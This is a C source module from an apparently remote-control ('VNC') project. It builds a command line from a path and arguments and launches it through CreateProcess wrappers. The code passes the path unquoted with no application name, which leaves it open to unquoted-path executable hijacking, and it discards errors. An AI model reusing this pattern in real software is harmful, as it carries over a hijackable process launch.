//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: exec.c
// $Revision: 137 $
// $Date: 2013-07-23 16:57:05 +0400 (Вт, 23 июл 2013) $
// description: 
//	executes command with arguments

#include "project.h"
#include "exec.h"

extern BOOL WINAPI CallCreateProcessW(
	LPWSTR lpApplicationName,
	LPWSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPWSTR lpCurrentDirectory,
	LPSTARTUPINFOW lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
);

extern BOOL WINAPI CallCreateProcessA(
	PCHAR lpApplicationName,
	PCHAR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	PCHAR lpCurrentDirectory,
	LPSTARTUPINFOA lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
);


//////////////////////////////////////////////////////////////////////////
// executes command with args
BOOL ExecuteCommandA(LPCSTR szPath,LPCSTR szArgs)
{
	BOOL fbResult = FALSE;
	LPSTR szCommand = NULL;
	ULONG szCommandLen;
	STARTUPINFOA	Si = {0};
	PROCESS_INFORMATION Pi = {0};

	Si.cb = sizeof(STARTUPINFO);
	Si.lpDesktop = NULL;

	szCommandLen = (lstrlenA(szPath) + 2)*sizeof(CHAR);
	if ( szArgs ){
		szCommandLen += lstrlenA(szArgs);
	}
	szCommand = hAlloc(szCommandLen);
	if ( szCommand )
	{
		lstrcpyA(szCommand,szPath);
		if ( szArgs ){
			lstrcatA(szCommand," ");
			lstrcatA(szCommand,szArgs);
		}

		if (!CallCreateProcessA(NULL, szCommand, NULL, NULL, FALSE, CREATE_DEFAULT_ERROR_MODE, NULL, NULL, &Si, &Pi))
		{
			//Status = GetLastError();
		}
		else
		{
			fbResult = TRUE;
			CloseHandle(Pi.hThread);
			CloseHandle(Pi.hProcess);
		}
		hFree(szCommand);
	}
	return fbResult;
}

BOOL ExecuteCommandW(LPCWSTR szPath,LPCWSTR szArgs)
{
	BOOL fbResult = FALSE;
	LPWSTR szCommand = NULL;
	ULONG szCommandLen;
	STARTUPINFOW	Si = {0};
	PROCESS_INFORMATION Pi = {0};

	Si.cb = sizeof(STARTUPINFO);
	Si.lpDesktop = NULL;

	szCommandLen = (lstrlenW(szPath) + 2)*sizeof(WCHAR);
	if ( szArgs ){
		szCommandLen += lstrlenW(szArgs)*sizeof(WCHAR);
	}
	szCommand = hAlloc(szCommandLen);
	if ( szCommand )
	{
		lstrcpyW(szCommand,szPath);
		if ( szArgs ){
			lstrcatW(szCommand,L" ");
			lstrcatW(szCommand,szArgs);
		}

		if (!CallCreateProcessW(NULL, szCommand, NULL, NULL, FALSE, CREATE_DEFAULT_ERROR_MODE, NULL, NULL, &Si, &Pi))
		{
			//Status = GetLastError();
		}
		else
		{
			fbResult = TRUE;
			CloseHandle(Pi.hThread);
			CloseHandle(Pi.hProcess);
		}
		hFree(szCommand);
	}
	return fbResult;
}